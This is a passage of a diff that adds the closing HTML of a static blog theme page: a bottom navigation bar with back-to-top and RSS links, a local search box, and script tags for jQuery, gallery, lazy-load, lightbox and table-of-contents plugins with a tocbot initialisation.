+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
